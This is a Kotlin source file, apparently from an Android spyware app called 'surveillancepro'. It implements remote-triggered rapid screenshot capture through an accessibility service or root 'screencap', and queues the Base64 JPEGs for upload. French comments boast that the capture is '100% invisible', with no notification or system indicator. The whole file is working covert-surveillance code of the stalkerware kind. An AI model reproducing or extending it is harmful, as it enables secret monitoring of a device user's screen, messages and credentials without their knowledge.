package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Capture d'écran rapide - 100% INVISIBLE
 * 
 * MÉTHODE SANS NOTIFICATION:
 * Utilise AccessibilityService.takeScreenshot() (Android 11+)
 * ou la méthode root si disponible.
 * 
 * AVANTAGES:
 * - Pas de notification visible
 * - Pas d'indicateur système
 * - Capture toutes les 2-3 secondes
 * - Crée une "vidéo" à partir des images
 * 
 * UTILISATION:
 * - Commande à distance pour démarrer/arrêter
 * - Capture automatique sur événements importants
 * - Mode surveillance continue
 */
object RapidScreenCapture {
    
    private const val TAG = "RapidScreenCapture"
    
    // Configuration
    private const val DEFAULT_INTERVAL_MS = 3000L // 3 secondes par défaut
    private const val MIN_INTERVAL_MS = 1000L // 1 seconde minimum
    private const val MAX_CAPTURES = 100 // Max 100 captures par session
    private const val JPEG_QUALITY = 60 // Qualité JPEG (60% pour réduire la taille)
    
    private var isCapturing = false
    private var captureCount = 0
    private var sessionId: String? = null
    private var intervalMs = DEFAULT_INTERVAL_MS
    
    private val handler = Handler(Looper.getMainLooper())
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
    
    // Référence au service d'accessibilité (nécessaire pour takeScreenshot)
    private var accessibilityService: AccessibilityService? = null
    
    /**
     * Définit le service d'accessibilité à utiliser.
     * Appelé depuis SupervisionAccessibilityService.onServiceConnected()
     */
    fun setAccessibilityService(service: AccessibilityService) {
        accessibilityService = service
        Log.d(TAG, "AccessibilityService set")
    }
    
    /**
     * Démarre la capture rapide d'écran.
     * @param context Le contexte Android
     * @param intervalMs L'intervalle entre les captures (min 1000ms)
     * @param maxCaptures Le nombre maximum de captures (défaut 100)
     * @param commandId L'ID de la commande (optionnel)
     */
    fun startCapture(
        context: Context,
        intervalMs: Long = DEFAULT_INTERVAL_MS,
        maxCaptures: Int = MAX_CAPTURES,
        commandId: Long = 0
    ) {
        if (isCapturing) {
            Log.w(TAG, "Already capturing")
            return
        }
        
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            Log.w(TAG, "Device not configured")
            return
        }
        
        this.intervalMs = maxOf(MIN_INTERVAL_MS, intervalMs)
        this.captureCount = 0
        this.sessionId = "session_${System.currentTimeMillis()}"
        this.isCapturing = true
        
        val queue = EventQueue.getInstance(context)
        
        // Événement de début de capture
        queue.enqueue("rapid_capture_started", mapOf<String, Any>(
            "sessionId" to (sessionId ?: ""),
            "intervalMs" to this.intervalMs,
            "maxCaptures" to maxCaptures,
            "commandId" to commandId,
            "timestamp" to dateFormat.format(Date()),
        ))
        
        Log.d(TAG, "Rapid capture started: interval=${this.intervalMs}ms, max=$maxCaptures")
        
        // Démarrer la boucle de capture
        captureLoop(context, maxCaptures, commandId)
    }
    
    /**
     * Arrête la capture rapide.
     */
    fun stopCapture(context: Context) {
        if (!isCapturing) return
        
        isCapturing = false
        handler.removeCallbacksAndMessages(null)
        
        val queue = EventQueue.getInstance(context)
        queue.enqueue("rapid_capture_stopped", mapOf<String, Any>(
            "sessionId" to (sessionId ?: ""),
            "totalCaptures" to captureCount,
            "timestamp" to dateFormat.format(Date()),
        ))
        
        // Sync immédiat pour envoyer les captures
        SyncWorker.triggerNow(context)
        
        Log.d(TAG, "Rapid capture stopped: $captureCount captures")
        
        sessionId = null
        captureCount = 0
    }
    
    /**
     * Capture une seule fois (pour les stories, etc.)
     */
    fun captureOnce(context: Context, tag: String) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            Log.w(TAG, "Device not configured")
            return
        }
        
        this.sessionId = "single_${tag}_${System.currentTimeMillis()}"
        captureScreen(context, 0)
    }
    
    /**
     * Boucle de capture.
     */
    private fun captureLoop(context: Context, maxCaptures: Int, commandId: Long) {
        if (!isCapturing || captureCount >= maxCaptures) {
            stopCapture(context)
            return
        }
        
        // Capturer l'écran
        captureScreen(context, commandId)
        
        // Programmer la prochaine capture
        handler.postDelayed({
            captureLoop(context, maxCaptures, commandId)
        }, intervalMs)
    }
    
    /**
     * Capture l'écran en utilisant la méthode disponible.
     */
    private fun captureScreen(context: Context, commandId: Long) {
        // Méthode 1: AccessibilityService.takeScreenshot() (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && accessibilityService != null) {
            captureViaAccessibility(context, commandId)
            return
        }
        
        // Méthode 2: Root (si disponible)
        if (com.surveillancepro.android.root.RootManager.isRooted()) {
            captureViaRoot(context, commandId)
            return
        }
        
        // Méthode 3: Fallback - envoyer un événement sans image
        Log.w(TAG, "No capture method available")
        val queue = EventQueue.getInstance(context)
        queue.enqueue("rapid_capture_failed", mapOf<String, Any>(
            "sessionId" to (sessionId ?: ""),
            "captureIndex" to captureCount,
            "reason" to "No capture method available (need Android 11+ or ROOT)",
            "timestamp" to dateFormat.format(Date()),
        ))
    }
    
    /**
     * Capture via AccessibilityService (Android 11+).
     * Cette méthode est 100% invisible - pas de notification!
     */
    private fun captureViaAccessibility(context: Context, commandId: Long) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return
        
        val service = accessibilityService ?: return
        
        try {
            service.takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                context.mainExecutor,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(
                                result.hardwareBuffer,
                                result.colorSpace
                            )
                            
                            if (bitmap != null) {
                                processScreenshot(context, bitmap, commandId)
                                result.hardwareBuffer.close()
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Screenshot processing failed: ${e.message}")
                        }
                    }
                    
                    override fun onFailure(errorCode: Int) {
                        Log.w(TAG, "Screenshot failed: errorCode=$errorCode")
                    }
                }
            )
        } catch (e: Exception) {
            Log.e(TAG, "takeScreenshot failed: ${e.message}")
        }
    }
    
    /**
     * Capture via commande root.
     */
    private fun captureViaRoot(context: Context, commandId: Long) {
        try {
            val filename = "/data/local/tmp/screenshot_${System.currentTimeMillis()}.png"
            val result = com.surveillancepro.android.root.RootManager.executeRootCommand(
                "screencap -p $filename"
            )
            
            if (result.success) {
                // Lire le fichier
                val file = java.io.File(filename)
                if (file.exists()) {
                    val bytes = file.readBytes()
                    val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                    if (bitmap != null) {
                        processScreenshot(context, bitmap, commandId)
                    }
                    // Supprimer le fichier temporaire
                    com.surveillancepro.android.root.RootManager.executeRootCommand("rm $filename")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Root screenshot failed: ${e.message}")
        }
    }
    
    /**
     * Traite et envoie la capture d'écran.
     */
    private fun processScreenshot(context: Context, bitmap: Bitmap, commandId: Long) {
        captureCount++
        
        try {
            // Redimensionner si trop grand (max 720p pour économiser la bande passante)
            val scaledBitmap = if (bitmap.width > 720 || bitmap.height > 1280) {
                val scale = minOf(720f / bitmap.width, 1280f / bitmap.height)
                Bitmap.createScaledBitmap(
                    bitmap,
                    (bitmap.width * scale).toInt(),
                    (bitmap.height * scale).toInt(),
                    true
                )
            } else {
                bitmap
            }
            
            // Convertir en JPEG Base64
            val outputStream = ByteArrayOutputStream()
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, outputStream)
            val imageBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
            
            // Envoyer l'événement
            val queue = EventQueue.getInstance(context)
            queue.enqueue("rapid_screenshot", mapOf<String, Any>(
                "sessionId" to (sessionId ?: ""),
                "captureIndex" to captureCount,
                "imageBase64" to imageBase64,
                "width" to scaledBitmap.width,
                "height" to scaledBitmap.height,
                "sizeBytes" to outputStream.size(),
                "commandId" to commandId,
                "timestamp" to dateFormat.format(Date()),
            ))
            
            Log.d(TAG, "Screenshot #$captureCount captured (${outputStream.size()} bytes)")
            
            // Libérer la mémoire
            if (scaledBitmap != bitmap) {
                scaledBitmap.recycle()
            }
            outputStream.close()
            
        } catch (e: Exception) {
            Log.e(TAG, "Screenshot processing error: ${e.message}")
        }
    }
    
    /**
     * Capture une seule image (pour les commandes ponctuelles).
     */
    fun captureSingle(context: Context, commandId: Long = 0) {
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) return
        
        sessionId = "single_${System.currentTimeMillis()}"
        captureCount = 0
        
        captureScreen(context, commandId)
    }
    
    /**
     * Retourne l'état actuel de la capture.
     */
    fun getStatus(): Map<String, Any> = mapOf(
        "isCapturing" to isCapturing,
        "sessionId" to (sessionId ?: ""),
        "captureCount" to captureCount,
        "intervalMs" to intervalMs,
    )
}
